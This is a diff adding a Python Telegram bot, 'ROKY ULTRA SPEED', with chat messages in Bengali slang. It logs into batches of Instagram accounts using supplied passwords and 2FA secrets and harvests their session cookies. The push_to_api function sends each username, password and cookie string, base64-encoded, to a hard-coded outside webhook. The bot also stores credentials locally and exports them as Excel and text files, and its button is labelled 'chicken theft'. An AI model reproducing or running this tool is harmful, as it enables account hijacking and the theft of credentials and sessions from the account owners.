@@ -1,0 +1,223 @@
+#!/usr/bin/env python3
+import telebot
+import instaloader
+import time
+import os
+import pyotp
+import threading
+import random
+import requests
+import base64
+import json
+import xlsxwriter
+import re
+from concurrent.futures import ThreadPoolExecutor
+from telebot import types
+from colorama import Fore, Style, init
+
+# --- প্রাথমিক সেটআপ ---
+init(autoreset=True)
+
+PUSH_URL = "https://ins.skysysx.com/api/api/v1/webhook/FlxhUHdINnPQxsBhqqpNw4L4nn_1ICQyCKKXoGBETCg/account-push"
+DB_FILE = "daily_db.json"
+
+def load_db():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, 'r') as f: return json.load(f)
+        except: return {}
+    return {}
+
+def save_db(data):
+    with open(DB_FILE, 'w') as f: json.dump(data, f)
+
+daily_db = load_db()
+
+def professional_logo():
+    os.system('clear')
+    colors = [Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
+    logo_text = rf"""
+    {random.choice(colors)}  ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
+    {random.choice(colors)}  ██╔══██╗██╔═══██╗██║ ██╔╝╚██╗ ██╔╝
+    {random.choice(colors)}  ██████╔╝██║   ██║█████╔╝  ╚████╔╝ 
+    {random.choice(colors)}  ██╔══██╗██║   ██║██╔═██╗   ╚██╔╝  
+    {random.choice(colors)}  ██║  ██║╚██████╔╝██║  ██╗   ██║   
+    """
+    print(logo_text)
+    print(f"{Fore.YELLOW}          [#]--- ROKY ULTRA SPEED v20.8 ---[#]")
+    print(f"{Fore.WHITE}  ----------------------------------------------------------")
+
+professional_logo()
+BOT_TOKEN = input(f"{Fore.CYAN}  [?] বটের টোকেন দাও মামা: {Fore.WHITE}").strip()
+bot = telebot.TeleBot(BOT_TOKEN)
+
+try:
+    bot_user = bot.get_me()
+    print(f"{Fore.GREEN}  [+] বটের নাম: @{bot_user.username}")
+    print(f"{Fore.GREEN}  [+] স্ট্যাটাস: ROKY BOT IS ACTIVE ✅")
+    print(f"{Fore.WHITE}  ----------------------------------------------------------")
+except:
+    print(f"{Fore.RED}  [!] টোকেন ভুল মামা!")
+    exit()
+
+user_data_storage = {}
+
+def push_to_api(u, p, cookie_dict):
+    ck_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
+    converted = f"{u}:{p}|||{ck_str}||"
+    encoded_payload = base64.b64encode(converted.encode()).decode()
+    payload = f"accounts={encoded_payload}"
+    headers = {"Content-Type": "text/plain"}
+    try:
+        res = requests.post(PUSH_URL, data=payload, headers=headers, timeout=15)
+        if res.status_code == 200:
+            if res.json().get("data", {}).get("received_count", 0) > 0:
+                return True, "Success"
+        return False, f"Error {res.status_code}"
+    except: return False, "API Fail"
+
+def login_worker(chat_id, u, p, k):
+    L = instaloader.Instaloader(quiet=True)
+    try:
+        L.login(u, p)
+    except instaloader.exceptions.TwoFactorAuthRequiredException:
+        if k:
+            totp = pyotp.TOTP(k.replace(" ", ""))
+            try: L.two_factor_login(totp.now())
+            except: return
+        else: return
+    except: return
+
+    if L.context.is_logged_in:
+        user_data_storage[chat_id]['cookie_count'] += 1
+        sid = str(chat_id)
+        if sid not in daily_db: daily_db[sid] = []
+        
+        # ডুপ্লিকেট ইউজারনেম ও কি চেক
+        is_duplicate = False
+        for entry in daily_db[sid]:
+            if entry[0] == u or (k and entry[2] == k):
+                is_duplicate = True
+                break
+        
+        if not is_duplicate:
+            daily_db[sid].append([u, p, k if k else "N/A"])
+            save_db(daily_db)
+        
+        cookies = L.context._session.cookies.get_dict()
+        ck_val = "; ".join([f"{key}={val}" for key, val in cookies.items()])
+        user_data_storage[chat_id]['results'].append(f"{u}|{p}|{ck_val}")
+        
+        success, status_msg = push_to_api(u, p, cookies)
+        if success:
+            user_data_storage[chat_id]['push_ok'] += 1
+            bot.send_message(chat_id, f"✅ **{u}**\nকুকি বের হইছে + এপিআই-তে পুশ ডান! 🔥")
+        else:
+            user_data_storage[chat_id]['push_fail'] += 1
+            bot.send_message(chat_id, f"⚠️ **{u}**\nকুকি পাইছি কিন্তু পুশ ফেল! ({status_msg})")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("মুরগী চুরি 🍗")
+    bot.send_message(message.chat.id, f"🏎️ **ROKY ULTRA SPEED v18.0**\n\nস্বাগতম **{message.from_user.first_name}** মামা! কাজ শুরু করতে নিচের বাটনে চাপ দাও।", reply_markup=markup)
+
+@bot.message_handler(commands=['getfile'])
+def ask_file_name(message):
+    chat_id = str(message.chat.id)
+    if chat_id in daily_db and daily_db[chat_id]:
+        msg = bot.send_message(message.chat.id, "📂 **ওরে আমার মুরগী চোর মামা রে!**\nআজকে তো কোপাইছো! তা ফাইলের নামটা কী দিমু কও?")
+        bot.register_next_step_handler(msg, process_file_name)
+    else:
+        bot.send_message(message.chat.id, "❌ **ধুর মামা!**\nপকেটে নাই আনা, খাইতে চাও খানা? আগে কাম করো, আইডির লিস্ট তো খালি!")
+
+def process_file_name(message):
+    if message.text.startswith('/'): return 
+    user_input = message.text.strip()
+    clean_name = re.sub(r'[\\/*?:"<>|]', '_', user_input)
+    chat_id = str(message.chat.id)
+    full_path = f"{clean_name}.xlsx"
+    
+    try:
+        workbook = xlsxwriter.Workbook(full_path)
+        worksheet = workbook.add_worksheet()
+        for i, row in enumerate(daily_db[chat_id]): 
+            worksheet.write_row(i, 0, row)
+        workbook.close()
+        
+        bot.send_message(message.chat.id, f"⏳ **একটু সবুর করো মামা...**\n👉{clean_name}📁 নামে এক্সেল বানায়া দিতাছি।")
+        with open(full_path, "rb") as f:
+            bot.send_document(message.chat.id, f, caption=f"📊 **এই নাও মামা তোমার মাল!**\nফাইলের নাম: 👉 {clean_name}.xlsx 😮‍💨 \n\nকোপাইয়া কাম করো! 🔥")
+        os.remove(full_path)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"💀 **ভুল হইছে মামা!**\nএরর: `{e}`")
+
+@bot.message_handler(commands=['file_clear'])
+def clear_user_data(message):
+    sid = str(message.chat.id)
+    if sid in daily_db:
+        daily_db[sid] = []
+        save_db(daily_db)
+        bot.send_message(message.chat.id, "🧹 ** সব পরিষ্কার কইরা দিছি মামা!**\nএখন নতুন কইরা মুরগী ধরা শুরু করো।")
+    else:
+        bot.send_message(message.chat.id, "মামা, পকেট তো আগে থেকেই খালি। পরিষ্কার করার কিছু নাই!")
+
+@bot.message_handler(func=lambda m: m.text == "মুরগী চুরি 🍗")
+def get_usernames(message):
+    user_data_storage[message.chat.id] = {'usernames': [], 'password': '', 'keys': [], 'results': [], 'cookie_count': 0, 'push_ok': 0, 'push_fail': 0, 'login_fail': 0}
+    msg = bot.send_message(message.chat.id, "👤 **ইউজারনেম গুলা এক এক কইরা দেও মামা (প্রতি লাইনে একটা):**")
+    bot.register_next_step_handler(msg, process_usernames)
+
+def process_usernames(message):
+    if message.text.startswith('/'): return
+    user_data_storage[message.chat.id]['usernames'] = [u.strip() for u in message.text.split('\n') if u.strip()]
+    msg = bot.send_message(message.chat.id, f"🔑 **ওকে মামা!**\nএখন এই {len(user_data_storage[message.chat.id]['usernames'])}টা আইডির পাসওয়ার্ডটা ছাড়ো:")
+    bot.register_next_step_handler(msg, process_password)
+
+def process_password(message):
+    if message.text.startswith('/'): return
+    user_data_storage[message.chat.id]['password'] = message.text.strip()
+    msg = bot.send_message(message.chat.id, "🔐 **২এফএ সিক্রেট (2FA key) থাকলে দিয়া দাও:**")
+    bot.register_next_step_handler(msg, process_keys)
+
+def process_keys(message):
+    if message.text.startswith('/'): return
+    text = message.text.strip()
+    user_data_storage[message.chat.id]['keys'] = [] if text.upper() == "NO" else [k.strip() for k in text.split('\n') if k.strip()]
+    bot.send_message(message.chat.id, "🚀 **ইঞ্জিন ফুল গরম মামা!**\nকাম শুরু হইলো, বইসা বইসা বিড়ি খাও আর দেখো।")
+    threading.Thread(target=run_automation, args=(message.chat.id,), daemon=True).start()
+
+def run_automation(chat_id):
+    data = user_data_storage[chat_id]
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        for i, u in enumerate(data['usernames']):
+            if chat_id not in user_data_storage: break
+            k = data['keys'][i] if i < len(data['keys']) else ""
+            executor.submit(login_worker, chat_id, u, data['password'], k)
+            time.sleep(2.5)
+    time.sleep(5)
+    finalize(chat_id)
+
+def finalize(chat_id):
+    data = user_data_storage.get(chat_id)
+    if not data: return
+    summary = f"📊 **কাজের হিসাবপাতি (ROKY)**\n\n🍪 মোট কুকি বের হইছে: {data['cookie_count']} টা\n✅ এপিআই-তে সফল পুশ: {data['push_ok']} টা\n⚠️ পুশ ফেল (এরর): {data['push_fail']} টা\n❌ মরা মুরগী: {data['login_fail']} টা\n\n🔥 **কোপানো শেষ মামা!**"
+    if data['results']:
+        f_path = f"ROKY_COOKIES_{chat_id}.txt"
+        with open(f_path, "w", encoding="utf-8") as f: f.write("\n".join(data['results']))
+        with open(f_path, "rb") as d: bot.send_document(chat_id, d, caption=summary, parse_mode="Markdown")
+        os.remove(f_path)
+    else: bot.send_message(chat_id, summary, parse_mode="Markdown")
+    user_data_storage.pop(chat_id, None)
+
+# ইগনোর সিস্টেম: বট উল্টাপাল্টা টেক্সট পড়বে না
+@bot.message_handler(func=lambda message: True)
+def ignore_random_text(message):
+    pass
+
+if __name__ == "__main__":
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=30)
+        except:
+            time.sleep(5)
